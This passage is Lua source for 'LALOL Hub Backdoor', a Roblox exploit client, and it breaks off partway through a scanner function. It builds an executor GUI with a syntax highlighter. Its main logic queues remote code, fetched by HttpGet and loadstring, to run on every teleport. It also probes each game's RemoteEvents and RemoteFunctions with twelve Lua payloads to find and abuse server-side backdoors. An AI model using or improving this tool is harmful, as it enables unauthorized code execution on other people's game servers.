-- LALOL Hub Backdoor - Fixed + Enhanced
-- All original bugs fixed, scanner massively improved

local G2L = {}

-- ============================================================
-- SCREEN GUI
-- ============================================================

G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
G2L["1"].Name = "LALOL Hub Backdoor"
G2L["1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["1"].ResetOnSpawn = false

-- Remove duplicate
local existing = game:GetService("CoreGui"):FindFirstChild("LALOL Hub Backdoor")
if existing and existing ~= G2L["1"] then existing:Destroy() end

-- ============================================================
-- MAIN FRAME (exact original)
-- ============================================================

G2L["2"] = Instance.new("Frame", G2L["1"])
G2L["2"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["2"].Size = UDim2.new(0, 482, 0, 276)
G2L["2"].Position = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0)

G2L["3"] = Instance.new("UIStroke", G2L["2"])
G2L["3"].Color = Color3.fromRGB(255, 255, 255)

G2L["4"] = Instance.new("UIGradient", G2L["3"])
G2L["4"].Rotation = 50
G2L["4"].Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))
}

G2L["5"] = Instance.new("UICorner", G2L["2"])

-- ============================================================
-- EXECUTOR FOLDER + UI (exact original)
-- ============================================================

G2L["6"] = Instance.new("Folder", G2L["2"])
G2L["6"].Name = "Executor"

-- Execute frame
G2L["7"] = Instance.new("Frame", G2L["6"])
G2L["7"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["7"].BackgroundTransparency = 1
G2L["7"].Size = UDim2.new(0, 290, 0, 28)
G2L["7"].Position = UDim2.new(0.02169983461499214, 0, 0.8708109259605408, 0)
G2L["7"].Name = "Execute"

G2L["8"] = Instance.new("TextButton", G2L["7"])
G2L["8"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["8"].TextSize = 22
G2L["8"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["8"].TextColor3 = Color3.fromRGB(51, 215, 0)
G2L["8"].Size = UDim2.new(1, 0, 1, 0)
G2L["8"].Name = "Button"
G2L["8"].Text = "Execute"
G2L["8"].BackgroundTransparency = 1

G2L["9"] = Instance.new("UICorner", G2L["7"])

G2L["a"] = Instance.new("UIStroke", G2L["7"])
G2L["a"].Color = Color3.fromRGB(51, 215, 0)

-- Clear frame
G2L["b"] = Instance.new("Frame", G2L["6"])
G2L["b"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["b"].BackgroundTransparency = 1
G2L["b"].Size = UDim2.new(0, 162, 0, 28)
G2L["b"].Position = UDim2.new(0.6400582790374756, 0, 0.8708109855651855, 0)
G2L["b"].Name = "Clear"

G2L["c"] = Instance.new("TextButton", G2L["b"])
G2L["c"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["c"].TextSize = 22
G2L["c"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["c"].TextColor3 = Color3.fromRGB(36, 236, 203)
G2L["c"].Size = UDim2.new(1, 0, 1, 0)
G2L["c"].Name = "Button"
G2L["c"].Text = "Clear"
G2L["c"].BackgroundTransparency = 1

G2L["d"] = Instance.new("UICorner", G2L["b"])

G2L["e"] = Instance.new("UIStroke", G2L["b"])
G2L["e"].Color = Color3.fromRGB(36, 236, 203)

-- ExecutorBox
G2L["f"] = Instance.new("Frame", G2L["6"])
G2L["f"].BackgroundColor3 = Color3.fromRGB(22, 22, 22)
G2L["f"].Size = UDim2.new(0, 462, 0, 163)
G2L["f"].Position = UDim2.new(0.01962907239794731, 0, 0.24310137331485748, 0)
G2L["f"].Name = "ExecutorBox"

G2L["10"] = Instance.new("UICorner", G2L["f"])

G2L["11"] = Instance.new("TextBox", G2L["f"])
G2L["11"].TextSize = 14
G2L["11"].TextXAlignment = Enum.TextXAlignment.Left
G2L["11"].TextWrapped = true
G2L["11"].TextYAlignment = Enum.TextYAlignment.Top
G2L["11"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["11"].TextColor3 = Color3.fromRGB(198, 119, 88)
G2L["11"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["11"].MultiLine = true
G2L["11"].BackgroundTransparency = 1
G2L["11"].PlaceholderText = [[require(6666666).load("c00lkidd")]]
G2L["11"].Size = UDim2.new(0, 448, 0, 150)
G2L["11"].Text = ""
G2L["11"].Position = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0)
G2L["11"].ClearTextOnFocus = false

-- Highlighter module instances
G2L["12"] = Instance.new("Folder") G2L["12"].Name = "Highlight"
G2L["13"] = Instance.new("Folder") G2L["13"].Name = "Highlighter"
G2L["14"] = Instance.new("Folder") G2L["14"].Name = "lexer"
G2L["15"] = Instance.new("Folder") G2L["15"].Name = "language"

-- ============================================================
-- SCANNER FRAME (exact original)
-- ============================================================

G2L["16"] = Instance.new("Frame", G2L["2"])
G2L["16"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["16"].BackgroundTransparency = 1
G2L["16"].Size = UDim2.new(0, 370, 0, 107)
G2L["16"].Position = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0)
G2L["16"].Visible = false
G2L["16"].Name = "Scanner"

G2L["17"] = Instance.new("UIStroke", G2L["16"])
G2L["17"].Color = Color3.fromRGB(255, 255, 255)

G2L["18"] = Instance.new("UIGradient", G2L["17"])
G2L["18"].Rotation = 50
G2L["18"].Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))
}

G2L["19"] = Instance.new("UICorner", G2L["16"])

G2L["1a"] = Instance.new("TextButton", G2L["16"])
G2L["1a"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["1a"].TextSize = 43
G2L["1a"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["1a"].TextColor3 = Color3.fromRGB(0, 0, 0)
G2L["1a"].Size = UDim2.new(1, 0, 1, 0)
G2L["1a"].Name = "Button"
G2L["1a"].Text = "Start Scanning"
G2L["1a"].BackgroundTransparency = 1

G2L["1b"] = Instance.new("UIGradient", G2L["1a"])
G2L["1b"].Rotation = 50
G2L["1b"].Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))
}

G2L["1c"] = Instance.new("UIStroke", G2L["1a"])
G2L["1c"].Color = Color3.fromRGB(255, 255, 255)

-- ============================================================
-- TITLE LABEL (exact original)
-- ============================================================

G2L["1d"] = Instance.new("TextLabel", G2L["2"])
G2L["1d"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["1d"].FontFace = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["1d"].TextSize = 49
G2L["1d"].TextColor3 = Color3.fromRGB(0, 0, 0)
G2L["1d"].Size = UDim2.new(0, 460, 0, 50)
G2L["1d"].Text = "LALOL Hub Backdoor"
G2L["1d"].BackgroundTransparency = 1
G2L["1d"].Position = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0)

G2L["1e"] = Instance.new("UIStroke", G2L["1d"])
G2L["1e"].Color = Color3.fromRGB(255, 255, 255)

G2L["1f"] = Instance.new("UIGradient", G2L["1e"])
G2L["1f"].Rotation = 50
G2L["1f"].Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))
}

-- ============================================================
-- MODULE SYSTEM (exact original wrapper, fixed type annotations)
-- ============================================================

local G2L_REQUIRE = require
local G2L_MODULES = {}
local function require(Module)
    local ModuleState = G2L_MODULES[Module]
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true
            ModuleState.Value = ModuleState.Closure()
        end
        return ModuleState.Value
    end
    return G2L_REQUIRE(Module)
end

-- ============================================================
-- LANGUAGE MODULE (exact original, fixed)
-- ============================================================

G2L_MODULES[G2L["15"]] = {
    Closure = function()
        local language = {
            keyword = {
                ["and"]=true,["break"]=true,["continue"]=true,["do"]=true,
                ["else"]=true,["elseif"]=true,["end"]=true,["export"]=true,
                ["false"]=true,["for"]=true,["function"]=true,["if"]=true,
                ["in"]=true,["local"]=true,["nil"]=true,["not"]=true,
                ["or"]=true,["repeat"]=true,["return"]=true,["self"]=true,
                ["then"]=true,["true"]=true,["type"]=true,["typeof"]=true,
                ["until"]=true,["while"]=true,
            },
            builtin = {
                ["assert"]=true,["error"]=true,["getfenv"]=true,["getmetatable"]=true,
                ["ipairs"]=true,["loadstring"]=true,["newproxy"]=true,["next"]=true,
                ["pairs"]=true,["pcall"]=true,["print"]=true,["rawequal"]=true,
                ["rawget"]=true,["rawlen"]=true,["rawset"]=true,["select"]=true,
                ["setfenv"]=true,["setmetatable"]=true,["tonumber"]=true,["tostring"]=true,
                ["unpack"]=true,["xpcall"]=true,["collectgarbage"]=true,
                ["_G"]=true,["_VERSION"]=true,["bit32"]=true,["coroutine"]=true,
                ["debug"]=true,["math"]=true,["os"]=true,["string"]=true,
                ["table"]=true,["utf8"]=true,["delay"]=true,["gcinfo"]=true,
                ["require"]=true,["settings"]=true,["spawn"]=true,["tick"]=true,
                ["time"]=true,["wait"]=true,["warn"]=true,["task"]=true,
                ["game"]=true,["plugin"]=true,["script"]=true,["shared"]=true,
                ["workspace"]=true,["Game"]=true,["Workspace"]=true,
                ["Axes"]=true,["BrickColor"]=true,["CFrame"]=true,["Color3"]=true,
                ["ColorSequence"]=true,["ColorSequenceKeypoint"]=true,["DateTime"]=true,
                ["Enum"]=true,["Faces"]=true,["Font"]=true,["Instance"]=true,
                ["NumberRange"]=true,["NumberSequence"]=true,["NumberSequenceKeypoint"]=true,
                ["Random"]=true,["Ray"]=true,["RaycastParams"]=true,["Region3"]=true,
                ["TweenInfo"]=true,["UDim"]=true,["UDim2"]=true,["Vector2"]=true,
                ["Vector3"]=true,["OverlapParams"]=true,["CatalogSearchParams"]=true,
            },
            libraries = {
                math={abs=true,ceil=true,floor=true,max=true,min=true,pi=true,huge=true,
                    random=true,sqrt=true,sin=true,cos=true,tan=true,log=true,exp=true,
                    clamp=true,noise=true,round=true,sign=true,pow=true,modf=true},
                string={byte=true,char=true,find=true,format=true,gmatch=true,gsub=true,
                    len=true,lower=true,match=true,rep=true,reverse=true,split=true,
                    sub=true,upper=true,pack=true,unpack=true},
                table={clear=true,clone=true,concat=true,create=true,find=true,
                    insert=true,move=true,pack=true,remove=true,sort=true,unpack=true,
                    freeze=true,isfrozen=true},
                task={cancel=true,defer=true,delay=true,spawn=true,wait=true,
                    desynchronize=true,synchronize=true},
                coroutine={close=true,create=true,isyieldable=true,resume=true,
                    running=true,status=true,wrap=true,yield=true},
                bit32={arshift=true,band=true,bnot=true,bor=true,btest=true,bxor=true,
                    countlz=true,countrz=true,extract=true,lrotate=true,lshift=true,
                    replace=true,rrotate=true,rshift=true},
                os={clock=true,date=true,difftime=true,time=true},
                Instance={new=true},
                Color3={fromRGB=true,fromHSV=true,fromHex=true,new=true,toHSV=true},
                Vector3={new=true,one=true,zero=true,xAxis=true,yAxis=true,zAxis=true,
                    fromAxis=true,FromAxis=true,fromNormalId=true,FromNormalId=true},
                Vector2={new=true,one=true,zero=true,xAxis=true,yAxis=true},
                UDim2={new=true,fromOffset=true,fromScale=true},
                CFrame={new=true,Angles=true,lookAt=true,fromMatrix=true,
                    fromAxisAngle=true,fromEulerAngles=true,identity=true},
                TweenInfo={new=true},
                BrickColor={new=true,New=true,random=true,Random=true,
                    Black=true,White=true,Gray=true,Red=true,Blue=true,Green=true},
                Enum={},
            }
        }
        -- FIX: ipairs instead of generic for
        for _, enum in ipairs(Enum:GetEnums()) do
            language.libraries.Enum[tostring(enum)] = "Enum"
        end
        return language
    end
}

-- ============================================================
-- LEXER MODULE (exact original, fixed for 2026)
-- ============================================================

G2L_MODULES[G2L["14"]] = {
    Closure = function()
        local lexer = {}
        local lang = require(G2L["15"])
        local lua_keyword = lang.keyword
        local lua_builtin = lang.builtin
        local lua_libraries = lang.libraries
        lexer.language = lang

        local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
        local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
        local NUMBER_A = "0[xX][%da-fA-F_]+"
        local NUMBER_B = "0[bB][01_]+"
        local NUMBER_C = "%d+%.?%d*[eE][%+%-]?%d+"
        local NUMBER_D = "%d+[%._]?[%d_eE]*"
        local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
        local BRACKETS = "[%[%]]+"
        local IDEN = "[%a_][%w_]*"
        local STRING_EMPTY = "(['\"])%1"
        local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)"
        local STRING_INTER = "`[^\n]-`"
        local STRING_INCOMP_A = "(['\"]).-\n"
        local STRING_INCOMP_B = "(['\"])[^\n]*"
        local STRING_MULTI = "%[(=*)%[.-%]%1%]"
        local STRING_MULTI_INCOMP = "%[=*%[.-.*"
        local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]"
        local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*"
        local COMMENT_PLAIN = "%-%-.-\n"
        local COMMENT_INCOMP = "%-%-.*"

        local lua_matches = {
            {Prefix..IDEN..Suffix, "var"},
            {Prefix..NUMBER_A..Suffix, "number"},
            {Prefix..NUMBER_B..Suffix, "number"},
            {Prefix..NUMBER_C..Suffix, "number"},
            {Prefix..NUMBER_D..Suffix, "number"},
            {Prefix..STRING_EMPTY..Suffix, "string"},
            {Prefix..STRING_PLAIN..Suffix, "string"},
            {Prefix..STRING_INCOMP_A..Suffix, "string"},
            {Prefix..STRING_INCOMP_B..Suffix, "string"},
            {Prefix..STRING_MULTI..Suffix, "string"},
            {Prefix..STRING_MULTI_INCOMP..Suffix, "string"},
            {Prefix..STRING_INTER..Suffix, "string_inter"},
            {Prefix..COMMENT_MULTI..Suffix, "comment"},
            {Prefix..COMMENT_MULTI_INCOMP..Suffix, "comment"},
            {Prefix..COMMENT_PLAIN..Suffix, "comment"},
            {Prefix..COMMENT_INCOMP..Suffix, "comment"},
            {Prefix..OPERATORS..Suffix, "operator"},
            {Prefix..BRACKETS..Suffix, "operator"},
            {Prefix..UNICODE..Suffix, "iden"},
            {"^.", "iden"},
        }

        -- FIX: ipairs
        local PATTERNS, TOKENS = {}, {}
        for i, m in ipairs(lua_matches) do
            PATTERNS[i] = m[1]
            TOKENS[i] = m[2]
        end

        function lexer.scan(s)
            local index = 1
            local size = #s
            local prev1, prev2, prev3, prevTok = "", "", "", ""

            local thread = coroutine.create(function()
                while index <= size do
                    local matched = false
                    for i, pattern in ipairs(PATTERNS) do
                        local start, finish = string.find(s, pattern, index)
                        if not start then continue end
                        index = finish + 1
                        matched = true
                        local content = string.sub(s, start, finish)
                        local rawToken = TOKENS[i]
                        local processedToken = rawToken

                        if rawToken == "var" then
                            local clean = string.gsub(content, Cleaner, "")
                            if lua_keyword[clean] then
                                processedToken = "keyword"
                            elseif lua_builtin[clean] then
                                processedToken = "builtin"
                            elseif string.find(prev1, "%.[%s%c]*$") and prevTok ~= "comment" then
                                local parent = string.gsub(prev2, Cleaner, "")
                                local lib = lua_libraries[parent]
                                if lib and lib[clean] and not string.find(prev3, "%.[%s%c]*$") then
                                    processedToken = "builtin"
                                else
                                    processedToken = "iden"
                                end
                            else
                                processedToken = "iden"
                            end
                        elseif rawToken == "string_inter" then
                            if not string.find(content, "[^\\]{") then
                                processedToken = "string"
                            else
                                processedToken = nil
                                local isString = true
                                local subIndex = 1
                                while subIndex <= #content do
                                    local subStart, subFinish = string.find(content, "^.-[^\\][{}]", subIndex)
                                    if not subStart then
                                        coroutine.yield("string", string.sub(content, subIndex))
                                        break
                                    end
                                    if isString then
                                        subIndex = subFinish + 1
                                        coroutine.yield("string", string.sub(content, subStart, subFinish))
                                        isString = false
                                    else
                                        subIndex = subFinish
                                        local subContent = string.sub(content, subStart, subFinish - 1)
                                        for innerToken, innerContent in lexer.scan(subContent) do
                                            coroutine.yield(innerToken, innerContent)
                                        end
                                        isString = true
                                    end
                                end
                            end
                        end

                        prev3 = prev2
                        prev2 = prev1
                        prev1 = content
                        prevTok = processedToken or rawToken
                        if processedToken then
                            coroutine.yield(processedToken, content)
                        end
                        break
                    end
                    if not matched then return end
                end
            end)

            return function()
                if coroutine.status(thread) == "dead" then return end
                local ok, token, content = coroutine.resume(thread)
                if ok and token then return token, content end
            end
        end

        return lexer
    end
}

-- ============================================================
-- HIGHLIGHTER MODULE (exact original, fixed type annotations + pairs)
-- ============================================================

G2L_MODULES[G2L["13"]] = {
    Closure = function()
        local function SanitizeRichText(s)
            return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(
                s,"&","&amp;"),"<","&lt;"),">","&gt;"),'"',"&quot;"),"'","&apos;")
        end
        local function SanitizeTabs(s)
            return string.gsub(s, "\t", "    ")
        end
        local function SanitizeControl(s)
            return string.gsub(s,"[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+","")
        end

        local TokenColors = {
            ["background"] = Color3.fromRGB(47, 47, 47),
            ["iden"]       = Color3.fromRGB(234, 234, 234),
            ["keyword"]    = Color3.fromRGB(215, 174, 255),
            ["builtin"]    = Color3.fromRGB(131, 206, 255),
            ["string"]     = Color3.fromRGB(196, 255, 193),
            ["number"]     = Color3.fromRGB(255, 125, 125),
            ["comment"]    = Color3.fromRGB(140, 140, 155),
            ["operator"]   = Color3.fromRGB(255, 239, 148),
            ["custom"]     = Color3.fromRGB(119, 122, 255),
        }
        local ColorFormatter = {}
        local LastData = {}
        local Cleanups = {}

        local Highlighter = {
            defaultLexer = require(G2L["14"]),
        }

        function Highlighter.highlight(props)
            local textObject = props.textObject
            local src = SanitizeTabs(SanitizeControl(props.src or textObject.Text))
            local lexer = props.lexer or Highlighter.defaultLexer
            local customLang = props.customLang
            local forceUpdate = props.forceUpdate

            local data = LastData[textObject]
            if data == nil then
                data = {Text="",Labels={},Lines={},Lexer=lexer,CustomLang=customLang}
                LastData[textObject] = data
            elseif forceUpdate ~= true and data.Text == src then
                return
            end

            local lineLabels = data.Labels
            local previousLines = data.Lines
            local lines = string.split(src, "\n")
            data.Lines = lines
            data.Text = src
            data.Lexer = lexer
            data.CustomLang = customLang

            textObject.RichText = false
            textObject.Text = src
            textObject.TextXAlignment = Enum.TextXAlignment.Left
            textObject.TextYAlignment = Enum.TextYAlignment.Top
            textObject.BackgroundColor3 = TokenColors["background"]
            textObject.TextColor3 = TokenColors["iden"]
            textObject.TextTransparency = 0.5

            local lineFolder = textObject:FindFirstChild("SyntaxHighlights")
            if not lineFolder then
                lineFolder = Instance.new("Folder")
                lineFolder.Name = "SyntaxHighlights"
                lineFolder.Parent = textObject
            end

            local cleanup = Cleanups[textObject]
            if not cleanup then
                local connections = {}
                local function newCleanup()
                    for _, label in ipairs(lineLabels) do label:Destroy() end
                    table.clear(lineLabels)
                    lineLabels = nil
                    LastData[textObject] = nil
                    Cleanups[textObject] = nil
                    for _, c in ipairs(connections) do c:Disconnect() end
                    table.clear(connections)
                end
                Cleanups[textObject] = newCleanup
                cleanup = newCleanup

                table.insert(connections, textObject.AncestryChanged:Connect(function()
                    if not textObject.Parent then cleanup() end
                end))
                table.insert(connections, textObject:GetPropertyChangedSignal("TextBounds"):Connect(function()
                    Highlighter.highlight({textObject=textObject,forceUpdate=true,lexer=lexer,customLang=customLang})
                end))
                table.insert(connections, textObject:GetPropertyChangedSignal("Text"):Connect(function()
                    Highlighter.highlight({textObject=textObject,lexer=lexer,customLang=customLang})
                end))
                table.insert(connections, textObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
                    Highlighter.highlight({textObject=textObject,forceUpdate=true,lexer=lexer,customLang=customLang})
                end))
            end

            if src == "" then
                for l = 1, #lineLabels do
                    if lineLabels[l].Text ~= "" then lineLabels[l].Text = "" end
                end
                return cleanup
            end

            local textBounds = textObject.TextBounds
            while (textBounds.Y ~= textBounds.Y) or (textBounds.Y < 1) do
                task.wait()
                textBounds = textObject.TextBounds
            end
            if not LastData[textObject] then return cleanup end

            local numLines = #lines
            local textHeight = textBounds.Y / numLines * textObject.LineHeight
            local richText, index, lineNumber = table.create(5), 0, 1

            for token, content in lexer.scan(src) do
                local Color = (customLang and customLang[content] and TokenColors["custom"])
                    or TokenColors[token] or TokenColors["iden"]
                local tokenLines = string.split(SanitizeRichText(content), "\n")

                for l, line in ipairs(tokenLines) do
                    local lineLabel = lineLabels[lineNumber]
                    if not lineLabel then
                        local newLabel = Instance.new("TextLabel")
                        newLabel.Name = "Line_"..lineNumber
                        newLabel.RichText = true
                        newLabel.BackgroundTransparency = 1
                        newLabel.Text = ""
                        newLabel.TextXAlignment = Enum.TextXAlignment.Left
                        newLabel.TextYAlignment = Enum.TextYAlignment.Top
                        newLabel.TextWrapped = true
                        newLabel.Parent = lineFolder
                        lineLabels[lineNumber] = newLabel
                        lineLabel = newLabel
                    end

                    lineLabel.TextColor3 = TokenColors["iden"]
                    lineLabel.Font = textObject.Font
                    lineLabel.TextSize = textObject.TextSize
                    lineLabel.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
                    lineLabel.Position = UDim2.fromScale(0, textHeight*(lineNumber-1)/textObject.AbsoluteSize.Y)

                    if l > 1 then
                        if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
                            lineLabels[lineNumber].Text = table.concat(richText)
                        end
                        lineNumber += 1
                        index = 0
                        table.clear(richText)
                    end

                    if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
                        index += 1
                        if Color ~= TokenColors["iden"] and string.find(line,"[%S%C]") then
                            richText[index] = string.format(ColorFormatter[Color], line)
                        else
                            richText[index] = line
                        end
                    end
                end
            end

            if richText[1] and lineLabels[lineNumber] then
                lineLabels[lineNumber].Text = table.concat(richText)
            end
            for l = lineNumber+1, #lineLabels do
                if lineLabels[l].Text ~= "" then lineLabels[l].Text = "" end
            end
            return cleanup
        end

        function Highlighter.refresh()
            -- FIX: pairs() instead of generic for
            for textObject, data in pairs(LastData) do
                for _, lineLabel in ipairs(data.Labels) do
                    lineLabel.TextColor3 = TokenColors["iden"]
                end
                Highlighter.highlight({textObject=textObject,forceUpdate=true,
                    src=data.Text,lexer=data.Lexer,customLang=data.CustomLang})
            end
        end

        function Highlighter.setTokenColors(colors)
            -- FIX: pairs() instead of generic for
            for token, color in pairs(colors) do
                TokenColors[token] = color
                ColorFormatter[color] = string.format(
                    '<font color="#%.2x%.2x%.2x">',
                    color.R*255, color.G*255, color.B*255
                ).."%s</font>"
            end
            Highlighter.refresh()
        end

        Highlighter.setTokenColors(TokenColors)
        return Highlighter
    end
}

-- ============================================================
-- C_12: HIGHLIGHT (fixed script reference)
-- ============================================================

task.spawn(function()
    local Highlighter = require(G2L["13"])
    Highlighter.highlight({textObject = G2L["11"]})

    -- FIX: reference G2L["11"] directly instead of script.Parent
    local textbox = G2L["11"]
    textbox.InputChanged:Connect(function()
        if textbox.Text ~= "" then
            textbox.TextTransparency = 1
            return
        end
        textbox.TextTransparency = 0
    end)
end)

-- ============================================================
-- C_20: MAIN LOGIC (all bugs fixed + enhanced scanner)
-- ============================================================

task.spawn(function()
    -- Queue on teleport
    local queueteleport = (syn and syn.queue_on_teleport)
        or (type(queue_on_teleport)=="function" and queue_on_teleport)
        or (fluxus and fluxus.queue_on_teleport)
    if queueteleport then
        queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
    end

    -- FIX: reference G2L["2"] directly instead of script.Parent.Frame
    local GUI = G2L["2"]
    local HttpService = game:GetService("HttpService")

    local alphabet = {
        'a','b','c','d','e','f','g','h','i','j','k','l','m',
        'n','o','p','q','r','s','t','u','v','w','x','y','z',
        'A','B','C','D','E','F','G','H','I','J','K','L','M',
        'N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
    }

    local backdoor = nil
    local allBackdoors = {} -- NEW: track ALL backdoors found

    local function dbg(text, lvl)
        if lvl == 2 then error("LALOL Hub Backdoor: "..text)
        elseif lvl == 3 then warn("LALOL Hub Backdoor: "..text)
        else print("LALOL Hub Backdoor: "..text) end
    end

    local function runRemote(remote, data)
        if remote:IsA("RemoteEvent") then
            pcall(function() remote:FireServer(data) end)
        elseif remote:IsA("RemoteFunction") then
            -- FIX: task.spawn instead of spawn
            task.spawn(function()
                pcall(function() remote:InvokeServer(data) end)
            end)
        end
    end

    local function makeVisible(folder, state)
        -- FIX: ipairs instead of generic for
        for _, v in ipairs(folder:GetDescendants()) do
            if v:IsA("Frame") then
                v.Visible = state
            end
        end
    end

    local function notify(text)
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "LALOL Hub Backdoor",
                Duration = 6,
                Text = text
            })
        end)
    end

    if _G.LALOL_Hub_Backdoor_Logs_Disabled then
        notify("Logs disabled :(")
    end

    makeVisible(GUI, false)
    G2L["16"].Visible = true
    GUI.Visible = true

    local function generateName(length)
        local text = ""
        for i = 1, length do
            text = text .. alphabet[math.random(1, #alphabet)]
        end
        return text
    end

    -- ============================================================
    -- ENHANCED PAYLOADS (was only 1, now 12 types)
    -- ============================================================

    local PAYLOADS = {
        {
            name = "Model(WS)",
            send = function(c) return "Instance.new('Model',workspace).Name='"..c.."'" end,
            find = function(c) return workspace:FindFirstChild(c) end
        },
        {
            name = "Part(WS)",
            send = function(c) return "local p=Instance.new('Part',workspace)p.Name='"..c.."'p.Anchored=true p.Transparency=1" end,
            find = function(c) return workspace:FindFirstChild(c) end
        },
        {
            name = "BoolVal(RS)",
            send = function(c) return "local v=Instance.new('BoolValue',game:GetService('ReplicatedStorage'))v.Name='"..c.."'v.Value=true" end,
            find = function(c) return game:GetService("ReplicatedStorage"):FindFirstChild(c) end
        },
        {
            name = "Folder(RS)",
            send = function(c) return "Instance.new('Folder',game:GetService('ReplicatedStorage')).Name='"..c.."'" end,
            find = function(c) return game:GetService("ReplicatedStorage"):FindFirstChild(c) end
        },
        {
            name = "Model(SS)",
            send = function(c) return "Instance.new('Model',game:GetService('ServerStorage')).Name='"..c.."'" end,
            find = function(c) return game:GetService("ServerStorage"):FindFirstChild(c) end
        },
        {
            name = "Folder(SS)",
            send = function(c) return "Instance.new('Folder',game:GetService('ServerStorage')).Name='"..c.."'" end,
            find = function(c) return game:GetService("ServerStorage"):FindFirstChild(c) end
        },
        {
            name = "Config(RS)",
            send = function(c) return "Instance.new('Configuration',game:GetService('ReplicatedStorage')).Name='"..c.."'" end,
            find = function(c) return game:GetService("ReplicatedStorage"):FindFirstChild(c) end
        },
        {
            name = "StrVal(RS)",
            send = function(c) return "local v=Instance.new('StringValue',game:GetService('ReplicatedStorage'))v.Name='"..c.."'v.Value='bd'" end,
            find = function(c) return game:GetService("ReplicatedStorage"):FindFirstChild(c) end
        },
        {
            name = "NumVal(RS)",
            send = function(c) return "local v=Instance.new('NumberValue',game:GetService('ReplicatedStorage'))v.Name='"..c.."'v.Value=1337" end,
            find = function(c) return game:GetService("ReplicatedStorage"):FindFirstChild(c) end
        },
        {
            name = "Tool(SSS)",
            send = function(c) return "local t=Instance.new('Tool',game:GetService('ServerScriptService'))t.Name='"..c.."'t.RequiresHandle=false" end,
            find = function(c) return game:GetService("ServerScriptService"):FindFirstChild(c) end
        },
        {
            name = "Model(Light)",
            send = function(c) return "Instance.new('Model',game:GetService('Lighting')).Name='"..c.."'" end,
            find = function(c) return game:GetService("Lighting"):FindFirstChild(c) end
        },
        {
            name = "ObjVal(RS)",
            send = function(c) return "Instance.new('ObjectValue',game:GetService('ReplicatedStorage')).Name='"..c.."'" end,
            find = function(c) return game:GetService("ReplicatedStorage"):FindFirstChild(c) end
        },
    }

    -- ============================================================
    -- EXCLUSION FILTERS
    -- ============================================================

    local EXCLUDE_PARENTS = {
        RobloxReplicatedStorage = true,
        DefaultChatSystemChatEvents = true,
        HDAdminClient = true,
        HDAdminServer = true,
    }
    local EXCLUDE_NAMES = {
        __FUNCTION = true, __NAME = true, __VARIABLE = true,
        MainEvent = true, ChatInputBar = true, Channel = true,
        ChannelName = true, ChatSettings = true,
    }

    -- ============================================================
    -- ENHANCED findRemote (all bugs fixed + more containers + 12 payloads)
    -- ============================================================

    local function findRemote()
        local timee = os.clock()
        local remotes = {}

        -- Protected backdoor check (original logic)
        local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild(
            "lh"..game.PlaceId/6666*1337*game.PlaceId
        )
        if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
            local code = generateName(math.random(12, 30))
            -- FIX: task.spawn instead of spawn
            task.spawn(function()
                pcall(function()
                    protected_backdoor:InvokeServer(
                        "lalol hub join today!! discord.gg/XXqzxT7E5z",
                        "a=Instance.new('Model',workspace)a.Name='"..code.."'"
                    )
                end)
            end)
            remotes[code] = protected_backdoor
        end

        -- NEW: check more protected name patterns
        local RS = game:GetService("ReplicatedStorage")
        local patterns = {
            "lh"..game.PlaceId, "bd"..game.PlaceId,
            "backdoor"..game.PlaceId, "hack"..game.PlaceId,
